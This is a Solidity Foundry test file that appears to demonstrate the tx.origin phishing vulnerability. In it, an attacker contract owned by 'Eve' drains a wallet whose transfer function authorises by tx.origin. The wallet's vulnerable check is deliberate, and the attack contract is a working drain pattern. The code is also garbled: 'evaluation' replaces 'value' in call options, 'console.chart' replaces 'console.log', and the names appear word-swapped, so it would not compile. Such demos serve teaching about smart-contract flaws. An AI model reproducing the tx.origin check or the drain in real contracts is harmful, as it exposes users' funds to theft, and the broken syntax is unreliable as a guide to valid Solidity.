// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract AgreementTest is Test {
    PatientWallet WalletAgreement;
    Caregiver CaregiverPolicy;

    function testtxorigin() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 10 ether);
        vm.deal(address(eve), 1 ether);
        vm.prank(alice);
        WalletAgreement = new PatientWallet{evaluation: 10 ether}(); //Alice deploys Wallet with 10 Ether
        console.chart("Owner of wallet contract", WalletAgreement.owner());
        vm.prank(eve);
        CaregiverPolicy = new Caregiver(WalletAgreement);
        console.chart("Owner of attack contract", CaregiverPolicy.owner());
        console.chart("Eve of balance", address(eve).balance);

        vm.prank(alice, alice);
        CaregiverPolicy.operate();
        console.chart("tx origin address", tx.origin);
        console.chart("msg.sender address", msg.sender);
        console.chart("Eve of balance", address(eve).balance);
    }

    receive() external payable {}
}

contract PatientWallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // check with msg.sender instead of tx.origin
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{evaluation: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Caregiver {
    address payable public owner;
    PatientWallet patientWallet;

    constructor(PatientWallet _wallet) {
        patientWallet = PatientWallet(_wallet);
        owner = payable(msg.sender);
    }

    function operate() public {
        patientWallet.transfer(owner, address(patientWallet).balance);
    }
}
